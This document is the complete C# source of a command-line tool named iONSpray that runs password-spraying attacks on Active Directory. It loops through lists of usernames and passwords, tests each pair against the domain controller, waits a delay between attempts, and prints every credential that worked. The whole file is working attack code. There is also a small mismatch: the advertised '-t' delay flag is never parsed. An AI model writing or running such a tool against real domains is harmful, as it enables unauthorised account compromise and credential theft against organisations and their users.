using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Threading;

namespace iONSpray
{
    class Program
    {
        static List<string> successfulAttempts = new List<string>();

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                DisplayHelpMenu();
                return;
            }

            string domainName = Environment.UserDomainName;
            string domainController = Environment.GetEnvironmentVariable("LOGONSERVER").Replace("\\", "");

            string usernamesFilePath = null;
            string passwordsFilePath = null;
            int delayInSeconds = 0;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-u" && i < args.Length - 1)
                {
                    usernamesFilePath = args[i + 1];
                }
                else if (args[i] == "-p" && i < args.Length - 1)
                {
                    passwordsFilePath = args[i + 1];
                }
            }

            if (string.IsNullOrEmpty(usernamesFilePath))
            {
                Console.Write("Enter the path to the usernames file (e.g., usernames.txt): ");
                usernamesFilePath = Console.ReadLine();
            }

            if (string.IsNullOrEmpty(passwordsFilePath))
            {
                Console.Write("Enter the path to the passwords file (e.g., passwords.txt): ");
                passwordsFilePath = Console.ReadLine();
            }

            if (delayInSeconds == 0)
            {
                Console.Write("Enter the delay between password attempts in seconds: ");
                delayInSeconds = int.Parse(Console.ReadLine());
            }

            int delayInMilliseconds = delayInSeconds * 1000;

            List<string> usernames = LoadFile(usernamesFilePath);
            List<string> passwords = LoadFile(passwordsFilePath);

            foreach (string username in usernames)
            {
                foreach (string password in passwords)
                {
                    Console.WriteLine($"Attempting password spray for user: {username} with password: {password}");

                    bool isAuthenticated = AuthenticateUser(username, password, domainName, domainController);

                    if (isAuthenticated)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Password spray successful for user: {username} with password: {password}");
                        Console.ResetColor();
                        Console.WriteLine();

                        successfulAttempts.Add($"User: {username}, Password: {password}");
                    }
                    else
                    {
                        Console.WriteLine($"Password spray unsuccessful for user: {username} with password: {password}");
                        Console.WriteLine();
                    }

                    Thread.Sleep(delayInMilliseconds);
                }
            }

            Console.WriteLine("Summary of Guessed Credentials:");
            foreach (string attempt in successfulAttempts)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(attempt);
                Console.ResetColor();
            }

            Environment.Exit(0);
        }

        static bool AuthenticateUser(string username, string password, string domainName, string domainController)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainController, domainName, username, password))
                {
                    return context.ValidateCredentials(username, password);
                }
            }
            catch
            {
                return false;
            }
        }

        static List<string> LoadFile(string filePath)
        {
            List<string> lines = new List<string>();

            try
            {
                lines = new List<string>(File.ReadAllLines(filePath));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while loading the file: {ex.Message}");
            }

            return lines;
        }

        static void DisplayHelpMenu()
        {
            Console.WriteLine("Password Spraying Utility Help Menu");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Usage: iONSpray.exe -u usernames.txt -p passwords.txt");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("-u <file>     Path to the file containing a list of usernames");
            Console.WriteLine("-p <file>     Path to the file containing a list of passwords");
            Console.WriteLine("-t <delay>    Delay in seconds");
            Console.WriteLine();
            Console.WriteLine("Example: iONSpray.exe -u usernames.txt -p passwords.txt");
        }
    }
}